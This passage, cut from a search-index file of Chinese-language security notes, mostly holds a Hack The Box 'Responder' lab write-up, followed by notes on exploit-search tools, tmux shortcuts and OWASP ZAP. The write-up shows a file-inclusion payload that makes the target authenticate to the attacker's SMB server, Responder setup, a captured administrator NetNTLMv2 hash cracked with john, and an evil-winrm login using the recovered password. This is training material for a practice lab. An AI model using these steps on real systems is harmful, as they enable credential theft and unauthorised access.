\u800c\u4e14\u7531\u4e8e\u6ca1\u6709\u5bf9\u8fd9\u4e2a\u9875\u9762\u53c2\u6570\u8fdb\u884c\u9002\u5f53\u7684\u6e05\u7406\uff0c\u6211\u4eec\u80fd\u591f\u4f20\u9012\u6076\u610f\u8f93\u5165\u5e76\u56e0\u6b64\u67e5\u770b\u5185\u90e8\u7cfb\u7edf\u6587\u4ef6\u3002</p> <p>\ud83d\udca1PHP \u4e2d\u7684 include() \u65b9\u6cd5\u662f\u4ec0\u4e48\uff1f include \u8bed\u53e5\u83b7\u53d6\u6307\u5b9a\u6587\u4ef6\u4e2d\u5b58\u5728\u7684\u6240\u6709\u6587\u672c/\u4ee3\u7801/\u6807\u8bb0\u5e76\u5c06\u5176\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u4f7f\u5176\u53ef\u4f9b\u4f7f\u7528\u3002 \u4f8b\u5982\uff1a</p> <pre><code>File 1 --&gt; vars.php\n&lt;?php\n$color = 'green';\n$fruit = 'apple';\n?&gt;\n#############################################\nFile 2 --&gt; test.php\n&lt;?php\necho \"A $color $fruit\"; // output = \"A\"\ninclude 'vars.php';\necho \"A $color $fruit\"; // output = \"A green apple\"\n?&gt;\n</code></pre> <p>\u6709\u5173 PHP \u7684 include() \u65b9\u6cd5\u7684\u66f4\u8be6\u7ec6\u8bf4\u660e\uff0c\u8bf7\u53c2\u89c1\u6b64\u5904\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#responder-challenge-capture","title":"Responder Challenge Capture","text":"<p>\u6211\u4eec\u77e5\u9053\u8fd9\u4e2a\u7f51\u9875\u5bb9\u6613\u53d7\u5230\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u5f71\u54cd\uff0c\u5e76\u4e14\u5728 Windows \u673a\u5668\u4e0a\u63d0\u4f9b\u670d\u52a1\u3002\u56e0\u6b64\uff0c\u5b58\u5728\u5728\u6211\u4eec\u7684\u653b\u51fb\u8005\u5de5\u4f5c\u7ad9\u4e0a\u5305\u542b\u6587\u4ef6\u7684\u53ef\u80fd\u6027\u3002\u5982\u679c\u6211\u4eec\u9009\u62e9\u50cf SMB \u8fd9\u6837\u7684\u534f\u8bae\uff0cWindows \u5c06\u5c1d\u8bd5\u5bf9\u6211\u4eec\u7684\u673a\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6211\u4eec\u53ef\u4ee5\u6355\u83b7 NetNTLMv2\u3002</p> <p>\u4ec0\u4e48\u662f NTLM\uff08\u65b0\u6280\u672f\u5c40\u57df\u7f51\u7ba1\u7406\u5668\uff09\uff1f</p> <p>NTLM \u662f Microsoft \u521b\u5efa\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u7684\u96c6\u5408\u3002\u5b83\u662f\u4e00\u79cd\u8d28\u8be2-\u54cd\u5e94\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u7528\u4e8e\u5411 Active Directory \u57df\u4e0a\u7684\u8d44\u6e90\u9a8c\u8bc1\u5ba2\u6237\u7aef\u3002</p> <p>\u5b83\u662f\u4e00\u79cd\u5355\u70b9\u767b\u5f55 (SSO)\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u7528\u6237\u5728\u767b\u5f55\u65f6\u53ea\u63d0\u4f9b\u4e00\u6b21\u5e95\u5c42\u8eab\u4efd\u9a8c\u8bc1\u56e0\u7d20\u3002</p> <p>NTLM \u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u6309\u4ee5\u4e0b\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <ol> <li>\u5ba2\u6237\u7aef\u5c06\u7528\u6237\u540d\u548c\u57df\u540d\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002</li> <li>\u670d\u52a1\u5668\u751f\u6210\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u79f0\u4e3a\u6311\u6218\u3002</li> <li>\u5ba2\u6237\u7aef\u4f7f\u7528\u7528\u6237\u5bc6\u7801\u7684 NTLM \u54c8\u5e0c\u52a0\u5bc6\u6311\u6218\u5e76\u5c06\u5176\u53d1\u9001\u56de\u670d\u52a1\u5668\u3002</li> <li>\u670d\u52a1\u5668\u68c0\u7d22\u7528\u6237\u5bc6\u7801\uff08\u6216\u7b49\u6548\u5bc6\u7801\uff09\u3002</li> <li>\u670d\u52a1\u5668\u4f7f\u7528\u4ece\u5b89\u5168\u5e10\u6237\u6570\u636e\u5e93\u4e2d\u68c0\u7d22\u5230\u7684\u54c8\u5e0c\u503c\u6765\u52a0\u5bc6\u6311\u6218\u5b57\u7b26\u4e32\u3002\u7136\u540e\u5c06\u8be5\u503c\u4e0e\u4ece\u5ba2\u6237\u7aef\u63a5\u6536\u5230\u7684\u503c\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u503c\u5339\u914d\uff0c\u5219\u5ba2\u6237\u7aef\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u3002</li> </ol> <p>\u53ef\u4ee5\u5728\u6b64\u5904\u627e\u5230\u6709\u5173 NTLM \u8eab\u4efd\u9a8c\u8bc1\u5de5\u4f5c\u7684\u66f4\u8be6\u7ec6\u8bf4\u660e\u3002</p> <p>NTLM vs NTHash vs NetNTMLv2</p> <p>\u56f4\u7ed5 NTLM \u8eab\u4efd\u9a8c\u8bc1\u7684\u672f\u8bed\u5f88\u6df7\u4e71\uff0c\u751a\u81f3\u4e13\u4e1a\u4eba\u58eb\u4e5f\u4e0d\u65f6\u6ee5\u7528\u5b83\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u5b9a\u4e49\u4e00\u4e9b\u5173\u952e\u672f\u8bed\uff1a</p> <p>\u54c8\u5e0c\u51fd\u6570\u662f\u4e00\u79cd\u5355\u5411\u51fd\u6570\uff0c\u5b83\u63a5\u53d7\u4efb\u610f\u6570\u91cf\u7684\u6570\u636e\u5e76\u8fd4\u56de\u56fa\u5b9a\u5927\u5c0f\u7684\u503c\u3002\u901a\u5e38\uff0c\u7ed3\u679c\u88ab\u79f0\u4e3a\u6563\u5217\u3001\u6458\u8981\u6216\u6307\u7eb9\u3002\u5b83\u4eec\u7528\u4e8e\u66f4\u5b89\u5168\u5730\u5b58\u50a8\u5bc6\u7801\uff0c\u56e0\u4e3a\u65e0\u6cd5\u5c06\u6563\u5217\u76f4\u63a5\u8f6c\u6362\u56de\u539f\u59cb\u6570\u636e\uff08\u5c3d\u7ba1\u5b58\u5728\u8bd5\u56fe\u4ece\u6563\u5217\u4e2d\u6062\u590d\u5bc6\u7801\u7684\u653b\u51fb\uff0c\u6211\u4eec\u7a0d\u540e\u4f1a\u770b\u5230\uff09\u3002\u56e0\u6b64\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u5b58\u50a8\u60a8\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff0c\u5f53\u60a8\u5411\u7f51\u7ad9\u63d0\u4ea4\u5bc6\u7801\u65f6\uff0c\u5b83\u4f1a\u5bf9\u60a8\u7684\u8f93\u5165\u8fdb\u884c\u54c8\u5e0c\u5904\u7406\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u54c8\u5e0c\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u5b83\u4eec\u5339\u914d\uff0c\u5b83\u5c31\u77e5\u9053\u60a8\u63d0\u4f9b\u4e86\u6b63\u786e\u7684\u5bc6\u7801\u3002</p> <p>NTHash \u662f\u7528\u4e8e\u5728 SAM \u6570\u636e\u5e93\u548c\u57df\u63a7\u5236\u5668\u4e0a\u5b58\u50a8 Windows \u7cfb\u7edf\u5bc6\u7801\u7684\u7b97\u6cd5\u7684\u8f93\u51fa\u3002 NTHash \u901a\u5e38\u88ab\u79f0\u4e3a NTLM \u54c8\u5e0c\uff0c\u751a\u81f3\u53ea\u662f NTLM\uff0c\u8fd9\u662f\u975e\u5e38\u5bb9\u6613\u8bef\u5bfc/\u6df7\u6dc6\u7684\u3002</p> <p>\u5f53 NTLM \u534f\u8bae\u60f3\u8981\u901a\u8fc7\u7f51\u7edc\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5b83\u4f7f\u7528\u5982\u4e0a\u6240\u8ff0\u7684\u8d28\u8be2/\u54cd\u5e94\u6a21\u578b\u3002 NetNTLMv2 \u8d28\u8be2/\u54cd\u5e94\u662f\u4e00\u4e2a\u4e13\u95e8\u683c\u5f0f\u5316\u4e3a\u5305\u542b\u8d28\u8be2\u548c\u54cd\u5e94\u7684\u5b57\u7b26\u4e32\u3002\u8fd9\u901a\u5e38\u79f0\u4e3a NetNTLMv2 \u6563\u5217\uff0c\u4f46\u5b83\u5b9e\u9645\u4e0a\u4e0d\u662f\u6563\u5217\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u5b83\u901a\u5e38\u88ab\u79f0\u4e3a\u54c8\u5e0c\uff0c\u56e0\u4e3a\u6211\u4eec\u4ee5\u76f8\u540c\u7684\u65b9\u5f0f\u653b\u51fb\u5b83\u3002\u60a8\u4f1a\u770b\u5230 NetNTLMv2 \u5bf9\u8c61\u88ab\u79f0\u4e3a NTLMv2\uff0c\u751a\u81f3\u4ee4\u4eba\u56f0\u60d1\u5730\u79f0\u4e3a NTLM\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#using-responder","title":"Using Responder","text":"<p>\u5728 PHP \u914d\u7f6e\u6587\u4ef6 php.ini \u4e2d\uff0c\u201callow_url_include\u201d\u5305\u88c5\u5668\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u201cOff\u201d\uff0c\u8868\u793a PHP \u4e0d\u52a0\u8f7d\u8fdc\u7a0b HTTP \u6216 FTP URL\uff0c\u4ee5\u9632\u6b62\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u653b\u51fb\u3002\u4f46\u662f\uff0c\u5373\u4f7f\u5c06 allow_url_include \u548c allow_url_fopen \u8bbe\u7f6e\u4e3a\u201cOff\u201d\uff0cPHP \u4e5f\u4e0d\u4f1a\u963b\u6b62\u52a0\u8f7d SMB URL\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u6ee5\u7528\u8fd9\u4e2a\u529f\u80fd\u6765\u7a83\u53d6 NTLM \u54c8\u5e0c\u3002</p> <p>\u73b0\u5728\uff0c\u4f7f\u7528\u6b64\u94fe\u63a5\u4e2d\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u52a0\u8f7d SMB URL\uff0c\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Responder \u4ece\u76ee\u6807\u6355\u83b7\u54c8\u5e0c\u3002</p> <p>\u54cd\u5e94\u5668\u5982\u4f55\u5de5\u4f5c</p> <p>Responder \u53ef\u4ee5\u8fdb\u884c\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u653b\u51fb\uff0c\u4f46\u5bf9\u4e8e\u8fd9\u79cd\u60c5\u51b5\uff0c\u5b83\u4f1a\u8bbe\u7f6e\u4e00\u4e2a\u6076\u610f SMB \u670d\u52a1\u5668\u3002\u5f53\u76ee\u6807\u673a\u5668\u5c1d\u8bd5\u5bf9\u8be5\u670d\u52a1\u5668\u6267\u884c NTLM \u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u54cd\u5e94\u7a0b\u5e8f\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u9001\u56de\u4e00\u4e2a\u8d28\u8be2\uff0c\u4ee5\u4f7f\u7528\u7528\u6237\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u3002\u5f53\u670d\u52a1\u5668\u54cd\u5e94\u65f6\uff0cResponder \u5c06\u4f7f\u7528\u8d28\u8be2\u548c\u52a0\u5bc6\u54cd\u5e94\u6765\u751f\u6210 NetNTLMv2\u3002\u867d\u7136\u6211\u4eec\u65e0\u6cd5\u9006\u8f6c NetNTLMv2\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8bb8\u591a\u4e0d\u540c\u7684\u5e38\u7528\u5bc6\u7801\uff0c\u770b\u770b\u662f\u5426\u6709\u4efb\u4f55\u751f\u6210\u76f8\u540c\u7684\u8d28\u8be2-\u54cd\u5e94\uff0c\u5982\u679c\u627e\u5230\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u90a3\u662f\u5bc6\u7801\u3002\u8fd9\u901a\u5e38\u88ab\u79f0\u4e3a\u6563\u5217\u7834\u89e3\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u4e00\u4e2a\u540d\u4e3a John The Ripper \u7684\u7a0b\u5e8f\u6765\u5b8c\u6210\u3002</p> <p>\u9996\u5148\uff0c\u5982\u679c\u673a\u5668\u4e0a\u5c1a\u672a\u5b89\u88c5 Responder \u5b9e\u7528\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c06 Responder \u5b58\u50a8\u5e93\u514b\u9686\u5230\u672c\u5730\u673a\u5668\u3002</p> <pre><code>git pull https://github.com/lgandx/Responder\n</code></pre> <p>\u9a8c\u8bc1 Responder.conf \u662f\u5426\u8bbe\u7f6e\u4e3a\u4fa6\u542c SMB \u8bf7\u6c42\u3002</p> <p></p> <p>\u914d\u7f6e\u6587\u4ef6\u51c6\u5907\u597d\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528 python3 \u542f\u52a8 Responder \uff0c\u4f20\u5165\u63a5\u53e3 \u4f7f\u7528 -I \u6807\u5fd7\u6536\u542c\uff1a</p> <pre><code>sudo python3 Responder.py -I tun0\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7\u5728\u7ec8\u7aef\u4e2d\u8fd0\u884c ifconfig \u547d\u4ee4\u6765\u68c0\u67e5\u7f51\u7edc\u63a5\u53e3\u3002</p> <p>\u5bf9\u4e8e Kali Linux \u6216 HTB Pawnbox\uff0cResponder \u9ed8\u8ba4\u5b89\u88c5\u4e3a\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff0c\u56e0\u6b64\u53ea\u9700\u8fd0\u884c\u547d\u4ee4 <code>sudo responder -I {network_interface}</code> \u5373\u53ef\u542f\u52a8\u5b83\u3002</p> <p>\u5982\u679c\u51fa\u73b0\u65e0\u6cd5\u5728\u7aef\u53e3 80 \u4e0a\u542f\u52a8 TCP \u670d\u52a1\u5668\u7684\u9519\u8bef\uff0c\u8fd9\u662f\u56e0\u4e3a\u7aef\u53e3 80 \u662f \u5df2\u88ab\u673a\u5668\u4e0a\u7684\u5176\u4ed6\u670d\u52a1\u4f7f\u7528\u3002 \u8fd9\u4e2a\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 Responder.conf \u6587\u4ef6\u4ee5\u5173\u95ed\u201c\u8981\u542f\u52a8\u7684\u670d\u52a1\u5668\u201d\u90e8\u5206\u4e0b\u5217\u51fa\u7684\u201cHTTP\u201d\u6761\u76ee</p> <pre><code>Location of Responder.conf file -\n-&gt; for default system install : /usr/share/responder/Responder.conf\n-&gt; for github installation : /installation_directory/Responder.conf\n</code></pre> <p>\u5728 Responder.conf \u6587\u4ef6\u7684\u201c\u8981\u542f\u52a8\u7684\u670d\u52a1\u5668\u201d\u90e8\u5206\u4e0b\u5c06\u201cHTTP\u201d\u6807\u5fd7\u8bbe\u7f6e\u4e3a\u201cOff\u201d\uff1a</p> <pre><code>; Servers to start\nSQL = On\nSMB = On\nRDP = On\nKerberos = On\nFTP = On\nPOP = On\nSMTP = On\nIMAP = On\nHTTP = On\n[** SNIP **]\n</code></pre> <p></p> <p>\u51c6\u5907\u597d Responder \u670d\u52a1\u5668\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e\u6765\u544a\u8bc9\u670d\u52a1\u5668\u5305\u542b\u6765\u81ea SMB \u670d\u52a1\u5668\u7684\u8d44\u6e90 \u9875\u9762\u53c2\u6570\u5982\u4e0b\u901a\u8fc7\u7f51\u7edc\u6d4f\u89c8\u5668\u3002</p> <pre><code>http://unika.htb/?page=//10.10.14.25/somefile\n</code></pre> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u81ea\u7531\u6307\u5b9a SMB \u5171\u4eab\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u6307\u5b9a\u4e86\u653b\u51fb\u673a\u5668\u7684 IP \u5730\u5740\u3002 \u73b0\u5728\u670d\u52a1\u5668\u5c1d\u8bd5\u4ece\u6211\u4eec\u7684 SMB \u670d\u52a1\u5668\u52a0\u8f7d\u8d44\u6e90\uff0c\u5e76\u4e14 Responder \u6355\u83b7\u4e86\u8db3\u591f\u7684\u8d44\u6e90\u4ee5\u83b7\u53d6 NetNTLMv2\u3002</p> <p>\u6ce8\u610f\uff1a\u786e\u4fdd\u5728\u5730\u5740\u4e2d\u6dfb\u52a0 http://\uff0c\u56e0\u4e3a\u67d0\u4e9b\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u9009\u62e9 Google \u641c\u7d22\u800c\u4e0d\u662f\u5bfc\u822a\u5230\u76f8\u5e94\u7684\u9875\u9762\u3002</p> <p>\u901a\u8fc7\u7f51\u7edc\u6d4f\u89c8\u5668\u53d1\u9001\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u540e\uff0c\u6211\u4eec\u6536\u5230\u4e00\u4e2a\u9519\u8bef\uff0c\u63d0\u793a\u65e0\u6cd5\u52a0\u8f7d\u8bf7\u6c42\u7684\u6587\u4ef6\u3002</p> <p></p> <p>\u4f46\u662f\u5728\u68c0\u67e5\u6211\u4eec\u7684\u76d1\u542c\u54cd\u5e94\u670d\u52a1\u5668\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6709\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406\u5458\u7528\u6237\u7684 NetNTLMv\u3002</p> <p></p> <p>NetNTLMv2 \u5305\u62ec\u8d28\u8be2\uff08\u968f\u673a\u6587\u672c\uff09\u548c\u52a0\u5bc6\u54cd\u5e94\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#hash-cracking","title":"Hash Cracking","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5c06\u54c8\u5e0c\u503c\u8f6c\u50a8\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5e76\u5c1d\u8bd5\u4f7f\u7528 john \u6765\u7834\u89e3\u5b83\uff0c\u5b83\u662f\u4e00\u4e2a\u5bc6\u7801\u54c8\u5e0c\u7834\u89e3\u5b9e\u7528\u7a0b\u5e8f\u3002</p> <pre><code>echo \"Administrator::DESKTOPH3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D\n801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E0048004500\n3800440049003400410053004300510004003400570049004E002D004E00480045003800440049003400410\n05300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C\n004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D\n801060004000200000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA926\n30A77E073056DA8C3F356D47C324C6D6D16F0A0010000000000000000000000000000000000009002000630\n06900660073002F00310030002E00310030002E00310034002E00320035000000000000000000\" &gt;\nhash.txt\n</code></pre> <p>\u6211\u4eec\u5c06\u54c8\u5e0c\u6587\u4ef6\u4f20\u9012\u7ed9 john \u5e76\u7834\u89e3\u7ba1\u7406\u5458\u5e10\u6237\u7684\u5bc6\u7801\u3002 \u6563\u5217\u7c7b\u578b\u7531 john \u547d\u4ee4\u884c\u5de5\u5177\u81ea\u52a8\u8bc6\u522b\u3002</p> <pre><code>-w : wordlist to use for cracking the hash\n</code></pre> <pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre> <p></p> <p>john \u5c06\u5c1d\u8bd5\u7ed9\u5b9a\u5bc6\u7801\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u5bc6\u7801\uff0c\u5e76\u4f7f\u7528\u8be5\u5bc6\u7801\u5bf9\u6311\u6218\u8fdb\u884c\u52a0\u5bc6\u3002 \u5982\u679c\u7ed3\u679c\u4e0e\u54cd\u5e94\u5339\u914d\uff0c\u5219\u5b83\u77e5\u9053\u5b83\u627e\u5230\u4e86\u6b63\u786e\u7684\u5bc6\u7801\u3002 \u81f3\u6b64\uff0cAdministrator\u8d26\u53f7\u5bc6\u7801\u7834\u89e3\u6210\u529f\u3002</p> <pre><code>password : badminton\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#winrm","title":"WinRM","text":"<p>\u6211\u4eec\u5c06\u8fde\u63a5\u5230\u76ee\u6807\u4e0a\u7684 WinRM \u670d\u52a1\u5e76\u5c1d\u8bd5\u83b7\u53d6\u4f1a\u8bdd\u3002 \u56e0\u4e3a Linux \u4e0a\u9ed8\u8ba4\u6ca1\u6709\u5b89\u88c5 PowerShell\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u4f7f\u7528\u4e00\u4e2a\u540d\u4e3a Evil-WinRM \u7684\u5de5\u5177\uff0c\u5b83\u662f\u4e3a\u8fd9\u79cd\u60c5\u51b5\u800c\u8bbe\u8ba1\u7684\u3002</p> <pre><code>evil-winrm -i 10.129.136.91 -u administrator -p badminton\n</code></pre> <p></p> <p>We can find the flag under C:\\Users\\mike\\Desktop\\flag.txt .</p> <p></p> <p>\u606d\u559c\uff01 \u60a8\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 type \u547d\u4ee4\u67e5\u770b flag.txt \u7684\u5185\u5bb9\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/","title":"Search Exploits","text":"Support HackTricks and get benefits!"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#browser","title":"Browser","text":"<p>Always search in \"google\" or others:  [version] exploit <p>You should also try the shodan exploit search from https://exploits.shodan.io/.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#searchsploit","title":"Searchsploit","text":"<p>Useful to search exploits for services in exploitdb from the console.</p> <pre><code>#Searchsploit tricks\nsearchsploit \"linux Kernel\" #Example\nsearchsploit apache mod_ssl #Other example\nsearchsploit -m 7618 #Paste the exploit in current directory\nsearchsploit -p 7618[.c] #Show complete path\nsearchsploit -x 7618[.c] #Open vi to inspect the exploit\nsearchsploit --nmap file.xml #Search vulns inside an nmap xml result\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#pompem","title":"Pompem","text":"<p>https://github.com/rfunix/Pompem is another tool to search for exploits</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#msf-search","title":"MSF-Search","text":"<pre><code>msf&gt; search platform:windows port:135 target:XP type:exploit\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#packetstorm","title":"PacketStorm","text":"<p>If nothing is found, try to search the used technology inside https://packetstormsecurity.com/</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#vulners","title":"Vulners","text":"<p>You can also search in vulners database: https://vulners.com/</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#sploitus","title":"Sploitus","text":"<p>This search exploits in other databases: https://sploitus.com/</p> Support HackTricks and get benefits!"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Search%20Exploits/#footer","title":"Footer","text":"<p>\u00a9 2022 GitHub, Inc.</p> <p>Footer navigationTermsPrivacySecurityStatusDocsContact GitHubPricingAPITrainingBlogAbout</p> <p>You have no unread notifications</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Tmux.md/","title":"Tmux.md","text":"<p>\u524d\u7f00\u5feb\u6377\u952e ^b  \u7a97\u683c\u64cd\u4f5c -   <code>%</code>\u00a0\u5de6\u53f3\u5e73\u5206\u51fa\u4e24\u4e2a\u7a97\u683c -   <code>\"</code>\u00a0\u4e0a\u4e0b\u5e73\u5206\u51fa\u4e24\u4e2a\u7a97\u683c -   <code>x</code>\u00a0\u5173\u95ed\u5f53\u524d\u7a97\u683c -   <code>{</code>\u00a0\u5f53\u524d\u7a97\u683c\u524d\u79fb -   <code>}</code>\u00a0\u5f53\u524d\u7a97\u683c\u540e\u79fb -   <code>;</code>\u00a0\u9009\u62e9\u4e0a\u6b21\u4f7f\u7528\u7684\u7a97\u683c -   <code>o</code>\u00a0\u9009\u62e9\u4e0b\u4e00\u4e2a\u7a97\u683c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e0b\u5de6\u53f3\u65b9\u5411\u952e\u6765\u9009\u62e9 -   <code>space</code>\u00a0\u5207\u6362\u7a97\u683c\u5e03\u5c40\uff0ctmux \u5185\u7f6e\u4e86\u4e94\u79cd\u7a97\u683c\u5e03\u5c40\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u00a0<code>\u23251</code>\u00a0\u81f3\u00a0<code>\u23255</code>\u6765\u5207\u6362 -   <code>z</code>\u00a0\u6700\u5927\u5316\u5f53\u524d\u7a97\u683c\uff0c\u518d\u6b21\u6267\u884c\u53ef\u6062\u590d\u539f\u6765\u5927\u5c0f -   <code>q</code>\u00a0\u663e\u793a\u6240\u6709\u7a97\u683c\u7684\u5e8f\u53f7\uff0c\u5728\u5e8f\u53f7\u51fa\u73b0\u671f\u95f4\u6309\u4e0b\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373\u53ef\u8df3\u8f6c\u81f3\u5bf9\u5e94\u7684\u7a97\u683c</p> <p>\u7a97\u53e3\u64cd\u4f5c -   <code>c</code>\u00a0\u65b0\u5efa\u7a97\u53e3\uff0c\u6b64\u65f6\u5f53\u524d\u7a97\u53e3\u4f1a\u5207\u6362\u81f3\u65b0\u7a97\u53e3\uff0c\u4e0d\u5f71\u54cd\u539f\u6709\u7a97\u53e3\u7684\u72b6\u6001</p> <ul> <li> <p><code>p</code>\u00a0\u5207\u6362\u81f3\u4e0a\u4e00\u7a97\u53e3</p> </li> <li> <p><code>n</code>\u00a0\u5207\u6362\u81f3\u4e0b\u4e00\u7a97\u53e3</p> </li> <li> <p><code>w</code>\u00a0\u7a97\u53e3\u5217\u8868\u9009\u62e9\uff0c\u6ce8\u610f macOS \u4e0b\u4f7f\u7528\u00a0<code>\u2303p</code>\u00a0\u548c\u00a0<code>\u2303n</code>\u00a0\u8fdb\u884c\u4e0a\u4e0b\u9009\u62e9</p> </li> <li> <p><code>&amp;</code>\u00a0\u5173\u95ed\u5f53\u524d\u7a97\u53e3</p> </li> <li> <p><code>,</code>\u00a0\u91cd\u547d\u540d\u7a97\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\uff0c\u91cd\u547d\u540d\u540e\u80fd\u5728 tmux \u72b6\u6001\u680f\u66f4\u5feb\u901f\u7684\u8bc6\u522b\u7a97\u53e3 id</p> </li> <li> <p><code>0</code>\u00a0\u5207\u6362\u81f3 0 \u53f7\u7a97\u53e3\uff0c\u4f7f\u7528\u5176\u4ed6\u6570\u5b57 id \u5207\u6362\u81f3\u5bf9\u5e94\u7a97\u53e3</p> </li> <li> <p><code>f</code>\u00a0\u6839\u636e\u7a97\u53e3\u540d\u641c\u7d22\u9009\u62e9\u7a97\u53e3\uff0c\u53ef\u6a21\u7cca\u5339\u914d</p> </li> </ul> <p>\u4f1a\u8bdd\u64cd\u4f5c -   <code>$</code>\u00a0\u91cd\u547d\u540d\u5f53\u524d\u4f1a\u8bdd</p> <ul> <li> <p><code>s</code>\u00a0\u9009\u62e9\u4f1a\u8bdd\u5217\u8868</p> </li> <li> <p><code>d</code>\u00a0detach \u5f53\u524d\u4f1a\u8bdd\uff0c\u8fd0\u884c\u540e\u5c06\u4f1a\u9000\u51fa tmux \u8fdb\u7a0b\uff0c\u8fd4\u56de\u81f3 shell \u4e3b\u8fdb\u7a0b</p> </li> </ul> <p>https://www.cnblogs.com/kaiye/p/6275207.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/ZAP%20useful/","title":"OWASP ZAP \u81ea\u52a8\u5316","text":"<p>OWASP ZAP \u5de5\u5177\u7528\u4e8e\u6b64\u5b66\u4e60\u8def\u5f84\u4e2d\u4ee5\u67e5\u627e\u6f0f\u6d1e\u5e76\u9a8c\u8bc1\u5b89\u5168\u5b9e\u65bd\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/ZAP%20useful/#_1","title":"\u6587\u6863","text":"<ul> <li>https://www.zaproxy.org/docs/desktop/addons/automation-framework/</li> <li>https://www.zaproxy.org/docs/automate/automation-framework/</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/hackthebox-Responder/","title":"hackthebox 